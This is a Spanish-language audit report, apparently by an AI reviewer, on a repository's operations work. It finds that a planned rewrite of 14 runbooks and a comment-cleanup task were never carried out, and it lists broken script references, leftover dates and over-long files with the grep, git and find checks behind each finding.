En el rango completo de la ola (`git diff --stat 2db0e9b..HEAD -- ops/pty-agent/`) lo único que cambió es `cauce-pty-launcher.sh | 18 ++++++`, y el diff es exactamente tu reap: la función reap_orphan_agents (17 líneas, comentario de invariante incluido) más la llamada `reap_orphan_agents` insertada en start_agent justo después de la re-verificación de generación. Commit 0a08de4. Cero cambios de producto atribuibles a los escritores de tests.

Nota de método: toda la mutación de esta revisión se hizo sobre `/tmp/mutcopy` (copia con `cp -a`, restaurada tras cada mutante). Verificado al cerrar: md5 de cauce_pty_agent.py y cauce-pty-launcher.sh idénticos entre repo y copia, `git status --porcelain` sin nada bajo ops/. (El árbol sí aparece sucio en apps/, services/ y docs/ por las otras instancias trabajando en paralelo.)

### [critica] (runbooks) La reescritura al formato nuevo nunca se ejecutó: 0 de 14 runbooks (+1 SQL) en HEAD

Ningún archivo de ops/runbooks/ contiene ninguna de las cuatro secciones fijas exigidas: `grep -rn -iE "Cuándo usar|Verificar efecto|Deshacer" ops/runbooks/*.md` devuelve 0 coincidencias. Los encabezados reales `##` de los 14 archivos siguen siendo los del formato narrativo previo (p.ej. alerting.md: 'Preparación reproducible/Gates/...'; container-adapters.md: 'Alcance e invariantes/Preparación e instalación/...'; telegram-cutover.md: 'Alcance y no-objetivos/Prerrequisitos/...'). La tarea se asignó como 'Parte C — Reescritura VERIFICADA de los 14 runbooks vivos' en el commit 158c6e893cd58dd1595a883c257e1e8079388e34 de ordenes/gemini.md (mismo Claude-Session que generó este encargo). Revisé `git log 2db0e9b..HEAD -- ops/runbooks/`: solo dos commits tocan la carpeta, 74f5c84 ('elimina instrucciones de QA retirada', solo edita e2e-integration.md sin cambiar formato) y 73e533c (borrado de _legado/, no toca runbooks). No existe reporte de cierre en ordenes/reportes/ (solo gemini-ronda-6.md y gemini-vistas-sin-uso.md, ninguno sobre runbooks). Además, HEAD actual (17aefe843b42b2d9a193e309bde8f0799fce9ad6, commit posterior al que originó este encargo) ya reescribió ordenes/gemini.md y reclasificó la tarea como intake condicional a ESTE reporte ('Tarea 2 — runbooks (si algún comando citado falló verificación → corregir el texto)'), sin listarla como pendiente activa: el propio orquestador ya no la trata como hecha. Consecuencia directa: las preguntas '¿cada comando citado es correcto?', '¿los de solo-lectura marcados con honestidad?' y '¿caveats integrados en el texto nuevo?' no tienen materia que auditar todavía — no existe texto reescrito sobre el cual aplicarlas.

### [mayor] (runbooks) Comandos ya inexistentes en el texto actual (sin reescribir) que cualquier reescritura futura debe corregir

Verificado con `ls ops/scripts/` (listado completo) y `find . -iname '<nombre>'` sobre todo el árbol (excluyendo node_modules): ops/runbooks/alias-cutover.md:22 cita `ops/scripts/preflight.sh` — no existe (solo existe `telegram-cutover-preflight.py`, archivo distinto). alias-cutover.md:78 y systemd.md:25 y container-adapters.md:199 citan `cutover-rollback.sh` — no existe en ops/scripts/ (solo `cutover.sh`, sin el rollback). alias-cutover.md:7 cita el schema `schemas/gate-snapshot.schema.json` — no existe en ningún punto del repo (`find . -iname '*gate-snapshot*'` vacío). systemd.md:6 cita `release-gate.sh` — no existe. backup-restore.md:27 y :177 citan `ops/scripts/restore.sh` — no existe (solo `backup.sh`, `host-backup.sh`, `host-backup-monitor.sh`). Estas cinco rutas ya estaban catalogadas como deuda conocida en el historial de git (--diff-filter=AD):149-151 ('Referencias vivas rotas a sabiendas... los runbooks se reescriben en FASE 3 (plan-reestructura/31)'), así que no son regresiones de esta ola, pero confirman que la verificación 'cada comando citado existe y es correcto' habría fallado en los 5 archivos donde se hubiera aplicado y nadie llegó a correrla. Por contraste, sí verifiqué como correctos: canary.sh, cutover.sh, validate-manifests.py, generate-units.py, migration-gate.mjs (alias-cutover.md/systemd.md), backup.sh, host-backup.sh, host-backup-monitor.sh, ut-nexus-backup.py/-verify.py y las 5 unidades systemd en ops/systemd/ (backup-restore.md), y los tres comandos de e2e-integration.md (`pnpm test:e2e` en package.json:34, `make -C ops test-doubles`/`smoke-cli` en ops/Makefile, `make -n` limpio en ambos).

### [mayor] (runbooks) Narrativa y fechas que la orden pedía eliminar ('sin narrativa ni fechas') siguen presentes porque la reescritura no llegó

ops/runbooks/backup-restore.md:57 tiene una fecha literal en el propio encabezado de sección: '## Respaldo automático de host (agora-storage) — 2026-07-25', y :59 narra en pasado 'Hasta 2026-07-25 no existía ningún respaldo automático de la base de producción...'. ops/runbooks/container-adapters.md:45 'Desde el cutover operativo del 2026-07-23, kant usa el harness codex...' y :57 'Desde el release de ops del 2026-07-23, kant... usan explícitamente el harness codex' — framing histórico, no procedimiento. ops/runbooks/encender-un-alias.md:3 'Escrito el 2026-07-31, después de encender trece alias en un día.' ops/runbooks/authentication.md:23 'Incidente real 2026-07-25 en cauce-v3-prod-gateway-1...'. Estos cuatro son exactamente el patrón que el formato nuevo debía eliminar; siguen intactos porque ninguno de estos archivos fue tocado por la reescritura.

### [menor] (runbooks) Los archivos exceden largamente el límite de ≤80 líneas que fijaba la orden de reescritura

wc -l sobre el estado actual: telegram-cutover.md 303 líneas, quota-collector.md 249 líneas, container-adapters.md 209 líneas, backup-restore.md 182 líneas, authentication.md 132 líneas — todos muy por encima del tope de 80 líneas que la orden fijaba para la versión reescrita. Es evidencia adicional (no una regresión nueva) de que ninguno pasó por la reescritura: el volumen es el de la prosa operativa original, no el de una guía 'Cuándo usar/Pasos/Verificar efecto/Deshacer' comprimida.

### [menor] (runbooks) No existe ningún esquema de marcado de verificación en ninguno de los 14 documentos

`grep -rn -iE "verificado\]|no ejecutable en verificaci|\[ejecutado\]|\[ok\]" ops/runbooks/*.md` devuelve 0 coincidencias. La orden pedía marcar cada comando de solo-lectura como ejecutado y cada comando mutante como `[no ejecutable en verificación]`; hoy no hay ningún marcado, ni honesto ni deshonesto — la pregunta 'los de solo-lectura ¿fueron marcados con honestidad?' no tiene materia sobre la cual aplicarse.

### [menor] (runbooks) El caveat dual-stack solo aparece integrado en 1 de los archivos que lo necesitan; el caveat de QA rota no aparece integrado en ninguno con ese texto

El caveat 'dual-stack solo-rollback' SÍ está integrado en ops/runbooks/alias-cutover.md:3 ('> La dual-stack V2/V3 ya no es operativa; esto aplica solo como referencia de rollback ((retirado; ver el historial de git (--diff-filter=AD))).') — nótese el error cosmético de doble paréntesis anidado. No aparece en systemd.md ni container-adapters.md, que tratan el mismo alcance de cutover/rollback por alias y sí lo necesitarían. El caveat 'QA rota hasta FASE 3' no aparece integrado en ningún runbook con ese texto explícito: vive solo en el historial de git (--diff-filter=AD):145 ('Referencias vivas rotas a sabiendas (se resuelven en FASE 3)') y se refleja de forma parafraseada y sin citar FASE 3 en ha.md:19-21 y e2e-integration.md:25-29 ('hasta que exista un reemplazo, este árbol no ofrece un gate de restart/fencing de clase release'). `grep -rn -i "FASE 3" ops/runbooks/*.md` da 0 resultados.

### [menor] (comentarios-limpieza) La tarea auditada no tiene commits que la ejecuten todavía

Se rastreó el rango 2db0e9b..HEAD (HEAD=74f5c84) filtrando por packages/store, packages/protocol, services/gateway, packages/adapter-sdk, console, services/terminal-relay y services/telegram-bridge. El único commit que emite la orden de limpieza de comentarios es dbc824d ('ordenes: limpieza quirurgica de comentarios enrutada por sector'), que SOLO modifica ordenes/codex.md y ordenes/gemini.md (5 líneas, sin tocar código fuente) — es el reparto de la tarea, no su ejecución. Tras dbc824d aparecen 4 commits más en esos sectores (dd2acd3 store, 5f0f4a0 ops, 74f5c84 docs, 158c6e8 ordenes) y ninguno borra comentarios: dd2acd3 ('store: aísla jerarquía y repara sus guardias') mueve StoreError a errors.ts y reindenta 46 firmas a columna 0 — tarea distinta del punto 1 de la orden a Codex — pero preserva byte a byte cada bloque de comentario que toca (verificado en el diff completo de messages.ts, observability.ts, outbox.ts, quotas.ts, jobs.ts: todos los JSDoc/comentarios narrativos siguen íntegros, solo cambia la indentación). Ningún commit de Codex o Gemini con firma 'store:', 'protocol:', 'gateway:', 'adapter:', 'console:', 'canales:' + conteo antes/después de líneas de comentario aparece en el rango.

### [menor] (comentarios-limpieza) Verificación directa: los marcadores del censo siguen intactos en el árbol de trabajo

Se comprobó en el working tree (no en un diff de commit, porque no hay commit que auditar) que ningún ítem señalado por el censo fue tocado: packages/store/src/repository/deliveries.ts:1289-1311 conserva los seis comentarios huérfanos `// S1`..`// S6` sin definir (el 'caso ejemplar' que la orden pide resolver, punto 4 de la tarea); packages/store/src/repository/observability.ts:531 y packages/store/src/repository/outbox.ts:1054 / observability.ts:1373 conservan las cifras narrativas duplicadas '881 entregas'/'197 entregas'; el bloque SQL `--` de packages/store/src/repository/agents/fanin.ts:987-991 (el caso sql-string intocable citado en la orden) sigue byte-idéntico y sin tocar; packages/protocol/src/schemas.ts:865 conserva el ejemplo invariante citado en el censo; services/gateway/src/terminal/tickets.ts:158-162 conserva el doble bloque JSDoc redundante sobre verifyTicketSignature que el censo marcó como mutilación mecánica a corregir. En console/src, 'MEDIDO en Chrome' sigue apareciendo en 9 ficheros y 'Steven' en 76 ubicaciones — ninguno de los ficheros 'narrativo dominante' del censo (config-css.test.ts, styles.tipografia.test.ts, etc.) fue tocado.

